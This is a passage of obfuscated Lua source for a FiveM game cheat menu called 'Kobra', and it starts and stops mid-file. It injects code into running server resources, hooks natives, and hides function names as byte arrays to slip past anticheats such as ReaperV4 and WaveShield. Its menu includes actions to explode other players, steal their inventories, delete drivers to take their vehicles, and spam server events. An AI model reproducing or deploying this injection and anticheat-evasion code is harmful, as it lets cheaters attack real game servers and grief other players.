                                ]]):format(v385));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v386=nil;for v540,v541 in pairs(v27) do if v541 then v386=v540;break;end end if v386 then local v598=GetPlayerFromServerId(v386);if ((v598== -(2 -1)) or  not DoesEntityExist(GetPlayerPed(v598))) then v271:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",4604 -(1032 + 572) );v27[v386]=nil;v12:UpdateListMenu();return;end local v599=GetPlayerPed(v598);local v600=GetEntityCoords(v599);local v601=GetEntityHeading(v599);SetEntityCoords(PlayerPedId(),v600.x,v600.y,v600.z,false,false,false,false);SetEntityHeading(PlayerPedId(),v601);v271:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v386)),v386),3000);else v271:Notify("error","Kobra","You must select a player to do this!",3417 -(203 + 214) );end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v387) local v388=1817 -(568 + 1249) ;local v389;while true do if (1==v388) then v271:HandleSpectateToggle(v389,v387);break;end if ((0 + 0)==v388) then v389=nil;for v781,v782 in pairs(v27) do if v782 then v389=v781;break;end end v388=1;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v390={};for v542,v543 in pairs(v27) do if v543 then v390[ #v390 + 1 ]=v542;end end if ( #v390==(0 -0)) then v271:Notify("error","Kobra","You must select a player to do this!",3000);return;end local v391=v390[1307 -(913 + 393) ];local v392=GetResourceState("ReaperV4")=="started" ;if v392 then MachoInjectThread(0 -0 ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v391));else local v602=0;local v603;local v604;local v605;local v606;local v607;while true do if (v602==(0 -0)) then v603=nil;function v603(v925) local v926={};for v1020=411 -(269 + 141) , #v925 do v926[v1020]=string.byte(v925,v1020);end return v926;end v604=nil;function v604(v927) local v928=0 -0 ;local v929;while true do if (v928==0) then v929="";for v1196=1982 -(362 + 1619) , #v927 do v929=v929   .. string.char(v927[v1196]) ;end v928=1626 -(950 + 675) ;end if (v928==(1 + 0)) then return v929;end end end v602=1180 -(216 + 963) ;end if ((1289 -(485 + 802))==v602) then v607=nil;function v607(v930) local v931=0;local v932;local v933;local v934;while true do if (v931==(560 -(432 + 127))) then v933=v605(v603("GetPlayerPed"))(v932);v934=v605(v603("PlayerPedId"))();v931=1075 -(1065 + 8) ;end if (v931==0) then v932=v606(v930);if (v932== -1) then print("^1[ERROR] Client ID not found for Server ID: "   .. v930   .. "^0" );return;end v931=1 + 0 ;end if (v931==(1603 -(635 + 966))) then if (v605(v603("DoesEntityExist"))(v933) and v605(v603("DoesEntityExist"))(v934)) then local v1244=0 + 0 ;while true do if (v1244==(43 -(5 + 37))) then v605(v603("SetPedComponentVariation"))(v934,14 -8 ,v605(v603("GetPedDrawableVariation"))(v933,3 + 3 ),v605(v603("GetPedTextureVariation"))(v933,9 -3 ),0);v605(v603("SetPedComponentVariation"))(v934,8,v605(v603("GetPedDrawableVariation"))(v933,4 + 4 ),v605(v603("GetPedTextureVariation"))(v933,16 -8 ),0);v605(v603("SetPedComponentVariation"))(v934,41 -30 ,v605(v603("GetPedDrawableVariation"))(v933,20 -9 ),v605(v603("GetPedTextureVariation"))(v933,11),0 -0 );v605(v603("SetPedPropIndex"))(v934,0 + 0 ,v605(v603("GetPedPropIndex"))(v933,529 -(318 + 211) ),v605(v603("GetPedPropTextureIndex"))(v933,0 -0 ),true);v1244=1589 -(963 + 624) ;end if ((1 + 1)==v1244) then v605(v603("SetPedPropIndex"))(v934,847 -(518 + 328) ,v605(v603("GetPedPropIndex"))(v933,2 -1 ),v605(v603("GetPedPropTextureIndex"))(v933,1 -0 ),true);v605(v603("SetPedPropIndex"))(v934,319 -(301 + 16) ,v605(v603("GetPedPropIndex"))(v933,5 -3 ),v605(v603("GetPedPropTextureIndex"))(v933,5 -3 ),true);print("^2[Kobra] Clothing copied successfully!^0");break;end if (v1244==(0 -0)) then print("^2[Kobra] Copying clothing from Server ID: "   .. v930   .. "^0" );v605(v603("SetPedComponentVariation"))(v934,1,v605(v603("GetPedDrawableVariation"))(v933,1),v605(v603("GetPedTextureVariation"))(v933,1 + 0 ),0 + 0 );v605(v603("SetPedComponentVariation"))(v934,5 -2 ,v605(v603("GetPedDrawableVariation"))(v933,2 + 1 ),v605(v603("GetPedTextureVariation"))(v933,1 + 2 ),0 -0 );v605(v603("SetPedComponentVariation"))(v934,2 + 2 ,v605(v603("GetPedDrawableVariation"))(v933,1023 -(829 + 190) ),v605(v603("GetPedTextureVariation"))(v933,4),0 -0 );v1244=1 -0 ;end end else print("^3[WARNING] Target or local ped does not exist.^0");end break;end end end v607(v391);break;end if (v602==1) then v605=nil;function v605(v935) local v936=0;local v937;local v938;while true do if (v936==(1 -0)) then return v938;end if (v936==(0 -0)) then v937=v604(v935);v938=_G[v937];v936=1 + 0 ;end end end v606=nil;function v606(v939) local v940=v605(v603("GetActivePlayers"))();for v1022,v1023 in ipairs(v940) do if (v605(v603("GetPlayerServerId"))(v1023)==v939) then return v1023;end end return  -(1 + 0);end v602=5 -3 ;end end end v271:Notify("success","Kobra","Copied clothing!",4718 + 282 );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v393={};for v544,v545 in pairs(v27) do if v545 then v393[ #v393 + (614 -(520 + 93)) ]=v544;end end if ( #v393==0) then v271:Notify("error","Kobra","You must select a player to do this!",3276 -(259 + 17) );return;end v271:HandleLaunchPlayer(v393);v271:Notify("success","Kobra","Attempting to TEST",5000);end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v394={};for v546,v547 in pairs(v27) do if v547 then v394[ #v394 + (3 -2) ]=v546;end end if ( #v394==(591 -(396 + 195))) then local v608=0;while true do if (0==v608) then v271:Notify("error","Kobra","You must select a player to do this!",8704 -5704 );return;end end end for v548,v549 in ipairs(v394) do local v550=v549;local v551=GetPlayerFromServerId(v549);if ((v551== -(1762 -(440 + 1321))) or  not DoesEntityExist(GetPlayerPed(v551))) then local v721=1829 -(1059 + 770) ;while true do if (v721==1) then return;end if (v721==(0 -0)) then v271:Notify("error","Kobra","You must select a player to do this!",3545 -(424 + 121) );v27[v549]=nil;v721=1;end end else local v722=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v550)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v722,v550);v271:Notify("success","Kobra","Attempting to Explode Player",912 + 4088 );end end v12:UpdateListMenu();end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v395={};for v552,v553 in pairs(v27) do if v553 then v395[ #v395 + (1348 -(641 + 706)) ]=v552;end end if ( #v395==(0 + 0)) then local v609=440 -(249 + 191) ;while true do if (v609==0) then v271:Notify("error","Kobra","You must select a player to do this!",13069 -10069 );return;end end end v271:HandleTakeInventory(v395);v271:Notify("success","Kobra","Attempting to steal inventory",2234 + 2766 );end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v396={};for v554,v555 in pairs(v27) do if v555 then v396[ #v396 + (428 -(183 + 244)) ]=v554;end end if ( #v396==(0 + 0)) then local v610=0;while true do if (v610==(730 -(434 + 296))) then v271:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v271:HandleClonePlayer(v396);v271:Notify("success","Kobra","Cloned Player",15955 -10955 );end},{type="button",label="Attack Clone Player",onSelect=function() local v397=0;local v398;while true do if (v397==(512 -(169 + 343))) then v398={};for v783,v784 in pairs(v27) do if v784 then v398[ #v398 + 1 ]=v783;end end v397=1;end if (v397==(1 + 0)) then if ( #v398==(0 -0)) then local v846=0;while true do if (v846==(0 -0)) then v271:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v271:HandleAttackClonePlayer(v398);v397=2 + 0 ;end if (v397==2) then v271:Notify("success","Kobra","Cloned Player",14180 -9180 );break;end end end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v399) local v400=918 -(782 + 136) ;local v401;while true do if ((856 -(112 + 743))==v400) then if ( #v401==0) then v271:Notify("error","Kobra","You must select a player to do this!",4171 -(1026 + 145) );return;end v12:AttachSelectedVehicle(v401,v399);v400=1 + 1 ;end if (v400==(720 -(493 + 225))) then v271:Notify("success","Kobra","Vehicle Attached to "   ..  #v401   .. " Player(s)" ,18378 -13378 );break;end if (v400==0) then v401={};for v785,v786 in pairs(v27) do if v786 then v401[ #v401 + 1 + 0 ]=v785;end end v400=2 -1 ;end end end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v402) local v403={};for v556,v557 in pairs(v27) do if v557 then v403[ #v403 + (2 -1) ]=v556;end end if ( #v403==(574 -(489 + 85))) then v271:Notify("error","Kobra","You must select at least one player!",3000);return;end v12.GetSelectedObjectModel=function(v558) return v402;end;v12:SpawnSelectedObject(v403);end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v405) local v406={};for v559,v560 in pairs(v27) do if v560 then v406[ #v406 + 1 ]=v559;end end if ( #v406==(0 + 0)) then local v611=0 + 0 ;while true do if (v611==(0 -0)) then v271:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v561) return v405;end;v12:SpawnSelectedObject(v406);v271:Notify("success","Kobra","Spawned object '"   .. tostring(v405)   .. "' for "   ..  #v406   .. " player(s)." ,6293 -1293 );end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v408) local v409=0;local v410;while true do if (v409==(4 -2)) then v12:SpawnSelectedObject(v410);break;end if (v409==(0 + 0)) then v410={};for v787,v788 in pairs(v27) do if v788 then v410[ #v410 + 1 ]=v787;end end v409=1;end if (v409==1) then if ( #v410==0) then local v847=0 -0 ;while true do if (v847==(0 -0)) then v271:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v789) return v408;end;v409=5 -3 ;end end end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v411) local v412={};for v562,v563 in pairs(v27) do if v563 then v412[ #v412 + 1 ]=v562;end end if ( #v412==0) then local v612=0 + 0 ;while true do if (v612==(0 -0)) then v271:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v564) return v411;end;v12:SpawnSelectedObject(v412);v271:Notify("success","Kobra","Spawned object '"   .. tostring(v411)   .. "' for "   ..  #v412   .. " player(s)." ,9261 -4261 );end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v414=nil;for v565,v566 in pairs(v27) do if v566 then v414=v565;break;end end if v414 then local v613=0 + 0 ;local v614;while true do if ((1 -0)==v613) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v614))) then local v1024=0 + 0 ;while true do if (v1024==(486 -(68 + 418))) then v271:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",3000);return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1114=2 -1 ,3 -1  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v614))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v613=2 + 0 ;end if (v613==(1094 -(770 + 322))) then v27[v414]=true;v271:UpdateListMenu();break;end if ((0 + 0)==v613) then v614=GetPlayerFromServerId(v414);if (v614== -(1 + 0)) then v271:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",410 + 2590 );v27[v414]=nil;v12:UpdateListMenu();return;end v613=1;end end else v271:Notify("error","Kobra","You must select a player to do this!",4292 -1292 );end end},{type="button",label="Teleport to Ocean",onSelect=function() local v415=0;local v416;while true do if (v415==(1 -0)) then if v416 then local v849=0 -0 ;local v850;while true do if (v849==(0 -0)) then v850=GetPlayerFromServerId(v416);if (v850== -(1 + 0)) then v271:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",3000);v27[v416]=nil;v12:UpdateListMenu();return;end v849=1 -0 ;end if (v849==2) then v27[v416]=true;v271:UpdateListMenu();break;end if (v849==1) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v850))) then local v1198=0;while true do if (v1198==(0 + 0)) then v271:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",1840 + 1160 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1245=1,2 + 0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v850))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v849=7 -5 ;end end else v271:Notify("error","Kobra","You must select a player to do this!",3000);end break;end if (v415==(0 -0)) then v416=nil;for v790,v791 in pairs(v27) do if v791 then v416=v790;break;end end v415=1 + 0 ;end end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v417) if v417 then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
